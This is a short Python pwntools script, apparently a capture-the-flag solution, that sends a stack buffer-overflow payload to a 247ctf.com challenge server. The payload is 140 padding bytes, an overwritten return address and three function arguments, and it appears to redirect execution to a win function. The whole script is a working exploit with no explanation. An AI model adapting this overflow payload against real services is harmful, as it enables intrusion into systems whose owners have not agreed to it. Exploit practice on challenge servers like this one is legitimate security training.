from pwn import *

payload = "A"*140+"\x76\x85\x04\x08"+"AAAA"+"\x37\x13\x00\x00"+"\x47\x02\x00\x00"+"\x78\x56\x34\x12"

p = remote('997cc67ac2b1c43c.247ctf.com', 50224)
print(p.recvuntil('You can ask for one though:'))
print(p.recvline())
p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
